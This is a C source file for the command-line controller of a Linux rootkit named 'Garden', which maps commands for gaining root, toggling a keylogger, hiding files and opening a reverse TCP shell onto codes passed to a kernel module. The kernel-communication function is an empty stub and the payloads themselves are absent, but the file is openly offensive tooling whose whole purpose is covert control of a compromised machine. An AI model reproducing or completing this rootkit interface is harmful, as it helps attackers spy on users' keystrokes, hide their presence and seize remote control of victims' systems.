#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

/**
 * ###########
 * Globals
 * ###########
 */

#define ROOT "root"
#define KEYLOGGER "keylogger"
#define ENABLE "enable"
#define DISABLE "disable"
#define REVERSE_TCP_SHELL "rev_tcp"
#define FILE_HIDE "hide"
#define ADD "add"
#define REMOVE "rm"
#define SHOW "show"

/**
 * ###########
 * Structs
 * ###########
 */

/**
 *Each function_code property is a unique number that will be passed to the
 * LKM to indicate what function to perform.
 */
typedef struct function_code {
  int get_root;
  int keylogger_enable;
  int keylogger_disable;
  int file_hide_add;
  int file_hide_rm;
  int file_hide_show;
  int reverse_tcp_shell;
} function_code;

function_code f_code = {
	.get_root = 0,
	.keylogger_enable = 1,
	.keylogger_disable = 2,
	.file_hide_add = 3,
	.file_hide_rm = 4,
	.file_hide_show = 5,
	.reverse_tcp_shell = 6
};

// This action_task struct is what is actually passed to the LKM.
typedef struct action_task {
  int func_code;
  char *file_hide_str;
} action_task;


/**
 * Printing
 */

void print_banner() {
	char *banner = "\t ██████╗  █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗\n \
\t██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║\n \
\t██║  ███╗███████║██████╔╝██║  ██║█████╗  ██╔██╗ ██║\n \
\t██║   ██║██╔══██║██╔══██╗██║  ██║██╔══╝  ██║╚██╗██║\n \
\t╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗██║ ╚████║\n \
\t ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝\n";

	printf("%s", banner);
}

void print_usage() {
	printf("Welcome to the Garden.\n--------------\n");
	printf("/garden root\t\t\t\t\t\t - gives you root.\n");
	printf("/garden keylogger [enable/disable]\t - toggles the keylogger.\n");
	printf("/garden hide add PREFIX\t\t\t\t - adds PREFIX to the hide list.\n");
	printf("/garden hide rm PREFIX\t\t\t\t - removes PREFIX from the hide list.\n");
	printf("/garden hide ls\t\t\t\t\t\t - shows prefixes in the hide list.\n");
	printf("/garden rev_tcp\t\t\t\t\t\t - opens a reverse shell using the IP and PORT configured during setup.\n");
	exit(0);
}

// TODO: Print in colors

/**
 * Uses SOME_FUNCTION to interface with rootkit. The LKM hooks this function
 * and responds to the actions as they come in.
 *
 * Returns 0 if successfully communicated, -1 otherwise.
 */
int communicate_with_lkm(action_task *data_to_pass) {
	return 0;
}

/**
 * Checks for subarg. If it doesn't exist, prints usage and
 * exits (inside print_usage).
 */
bool check_for_subarg(int idx, char *argv[]) {
	if (! argv[idx]) {
		print_usage();
	}
	return true;
}

void handle_get_root(char *base_cmd, action_task *action) {
	if (! strcmp(base_cmd, ROOT)) {
		action->func_code = f_code.get_root;
	}
}

void handle_reverse_tcp_shell(char *base_cmd, action_task *action) {
	if (! strcmp(base_cmd, REVERSE_TCP_SHELL)) {
		action->func_code = f_code.reverse_tcp_shell;
	}
}

/**
 * Populates action_task* action which is ready to be communicated to kernel if
 * keylogger action is commanded by user. Returns true if keylogger action
 * detected, otherwise, returns false.
 *
 * Handles:
 * 	$ keylogger enable
 * 	$ keylogger disable
 */
bool handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) {
	if (! strcmp(base_cmd, KEYLOGGER)) {
		if (! strcmp(subarg, ENABLE)) { // Keylogger enable
			action->func_code = f_code.keylogger_enable;
		} else if (! strcmp(subarg, DISABLE)) { // Keylogger disable
			action->func_code = f_code.keylogger_disable;
		}
	}
}

/**
 * Handles three commands:
 * 	$ hide show
 * 	$ hide add FILE
 * 	$ hide rm FILE
 */
void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_task *action) {
	if (! strcmp(base_cmd, FILE_HIDE)) {
		if (! strcmp(subarg, SHOW)) {
			action->func_code = f_code.file_hide_show;
		} else if (check_for_subarg(3, argv)) { // Make sure the 3rd arg in $ hide [add/rm] FILE exists
			if (! strcmp(subarg, ADD)) {
				action->func_code = f_code.file_hide_add;
			} else if (! strcmp(subarg, REMOVE)) {
				action->func_code = f_code.file_hide_rm;
			} else {
				print_usage();
			}
			action->file_hide_str = argv[3];
		}
	}
}

/**
 * If the action_task struct is populated, executes task and returns true.
 * Otherwise, returns false.
 */
bool execute_action_if_possible(action_task *action) {
	if (action->func_code != - 1) {
		communicate_with_lkm(action);
		return true;
	} else {
		return false;
	}
}

/**
 * CLI for interacting with the rootkit and interfacing with the kernel module.
 */
int main(int argc, char *argv[]) {
	print_banner();

	// No args entered. Display help menu.
	if (argc == 1 || ! strcmp(argv[1], "-h") || ! strcmp(argv[1], "--help")) {
		print_usage();
		return 0;
	}

	// Set up action_task. This is what will be passed to the LKM to make
	// things happen. Set the func_code to -1 initially so we can detect failure
	// to set any options later.
	action_task action;
	memset(&action, 0, sizeof(action));
	action.func_code = - 1;

	// Parse single arg commands
	char *base_cmd = argv[1];
	handle_get_root(base_cmd, &action);
	handle_reverse_tcp_shell(base_cmd, &action);
	execute_action_if_possible(&action);

	// Parse double arg commands
	check_for_subarg(2, argv);
	char *subarg = argv[2];
	handle_keylogger_action(base_cmd, subarg, &action);

	// Parse triple arg commands
	handle_file_hide_action(base_cmd, subarg, argv, &action);
	execute_action_if_possible(&action);

	// If we get here, no valid command has been entered.
	print_usage();
	return 0;
}
